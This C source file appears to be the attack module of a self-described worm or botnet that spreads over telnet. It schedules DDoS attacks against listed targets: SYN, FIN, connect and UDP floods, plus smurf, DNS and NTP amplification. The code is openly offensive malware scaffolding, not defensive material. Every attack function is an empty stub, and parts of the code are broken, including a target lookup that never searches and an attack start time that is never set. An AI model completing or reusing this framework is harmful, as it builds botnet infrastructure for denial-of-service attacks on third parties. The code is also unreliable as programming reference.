/*
round two.. using windows subsystem for linux.. i did a grep -R -i "etc" in the parent/parent dir and it crashed the system
and i lost this module.. so i have to develop it again :(

*/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdint.h>
#include <time.h>
#include <list.h>
#include "structs.h"
#include "utils.h"
#include "attacks.h"

#define ATTACKS_MODULE_ID 5
#define ATTACK_IDLE_INTERVAL 30

int attack_raw_sock = 0;
int attack_sock = 0;


int attack_main_loop(Modules *mptr, Connection *cptr, char *buf, int size);
int attack_tcp_connect(Modules *mptr, Connection *cptr, char *buf, int size);
int attack_tcp_disconnect(Modules *mptr, Connection *cptr, char *buf, int size);
Attack *attack_list = NULL;



Attack *AttackFindByDST(uint32_t dst) {
    Attack *aptr = NULL;
    while (aptr != NULL) {
        if (aptr->dst == dst) break;
        aptr = aptr->next;
    }
    return aptr;
}

int attack_add(uint32_t src, int src_port, uint32_t dst, int dst_port, int attack_type) {
    Attack *aptr = NULL;
    
    if ((aptr = (Attack *)L_add((LIST **)&attack_list, sizeof(Attack))) == NULL) {
        return -1;
    }
    
    aptr->src = src;
    aptr->dst = dst;
    aptr->src_port = src_port;
    aptr->dst_port = dst_port;
    aptr->attack_type = attack_type;
    // default of  3600
    aptr->end_interval = 3600;
    
    return 1;
}



// telnet brute forcing doesnt need nearly as many functions..
ModuleFuncs attack_funcs = { 
    NULL, NULL,
    NULL,
    NULL,
    &attack_main_loop,
    &attack_tcp_connect, // no connect.. we're getting it passed over'
    &attack_tcp_disconnect, // nmo discomnnect for attacks
    NULL
};

Modules ATTACK = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0, 0, 1,
    // module ID
    ATTACKS_MODULE_ID, 0,
    // port, state
    23, 0,
    // required 0, 0..  
    0, 0,
    //timer = 300 seconds (5min) - get new nodes, etc
    // we will run this every 5 seconds since we are a WORM
    ATTACK_IDLE_INTERVAL,
    // telnet functions
    &attack_funcs, NULL,
    // no magic bytes for telnet
    NULL, 0
};

int attack_init(Modules **module_list) {
    Module_Add(module_list, &ATTACK);
}


int attack_enable(uint32_t dst, int flag) {
    Attack *aptr = AttackFindByDST(dst);
    
    if (aptr != NULL) {
        aptr->enabled = flag;
        return 1;
    }
    
    return 0;
}



typedef int (*attack_func)(Modules *, Connection *, char *, int);

int attack_syn_flood(Modules *mptr, Connection *cptr, char *buf, int size);
int attack_fin_flood(Modules *mptr, Connection *cptr, char *buf, int size);
int attack_connect_flood(Modules *mptr, Connection *cptr, char *buf, int size);
int attack_udp(Modules *mptr, Connection *cptr, char *buf, int size);
int attack_ddos_smurf(Modules *mptr, Connection *cptr, char *buf, int size);
int attack_ddos_dns(Modules *mptr, Connection *cptr, char *buf, int size);
int attack_ddos_ntp(Modules *mptr, Connection *cptr, char *buf, int size);
int attack_init(Modules **module_list);

enum {
    ATTACK_NONE,
    ATTACK_SYN,
    ATTACK_FIN,
    ATTACK_CONNECT,
    ATTACK_UDP,
    ATTACK_DDOS_SMURF,
    ATTACK_DDOS_NTP,
    ATTACK_DDOS_DNS,
    ATTACK_END
};


attack_func AttackFindFunction(int type) {
    int i = 0;
    // this is the structure list of all attacks implemented, and their corresponding functions required to queue the
    // packets for the attacks
    struct _attacks {
        int type;
        attack_func function;
    } Attacks[] = {
        { ATTACK_SYN, &attack_syn_flood },
        { ATTACK_FIN, &attack_fin_flood },
        { ATTACK_CONNECT, &attack_connect_flood },
        { ATTACK_UDP, &attack_udp },
        { ATTACK_DDOS_SMURF, &attack_ddos_smurf },
        { ATTACK_DDOS_DNS, &attack_ddos_dns },
        { ATTACK_DDOS_NTP, &attack_ddos_ntp },
        { 0, NULL }
    };

    while (Attacks[i].function != NULL) {
        if (Attacks[i].type == type)
            return (attack_func) Attacks[i].function;
        
        i++;
    }
    
    return NULL;
}


int attack_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
    Attack *aptr = attack_list;
    int count = 0;
    int cur_ts = time(0);
    attack_func function;
    int ret = 0;
    
    
    while (aptr != NULL) {
        
        // see if its the end of this attack (so we can remove it)
        if ((cur_ts - aptr->start_ts) > aptr->end_interval) {
            L_del_next((LIST **)&attack_list, (LIST *)aptr, (LIST **)&aptr);
            continue;
        }
        
        if (aptr->enabled) {
            count++;
            
            function = AttackFindFunction(aptr->attack_type);
            
            if (function != NULL) {
                // run the attack function
                function(mptr, cptr, buf, size);
                
                ret = 1;
            }
                
        }
        
        aptr = aptr->next;
    }
    
    // set the timer accordingly to whether or not we have any attacks enabled or disabled
    ATTACK.timer_interval = count ? 1 : ATTACK_IDLE_INTERVAL;

    return ret;
}

int attack_syn_flood(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int attack_fin_flood(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int attack_connect_flood(Modules *mptr, Connection *cptr, char *buf, int size) {
    // connect uses non raw socks to perform connections on the host..
}

int attack_udp(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int attack_ddos_smurf(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int attack_ddos_dns(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int attack_ddos_ntp(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int attack_tcp_connect(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int attack_tcp_disconnect(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}
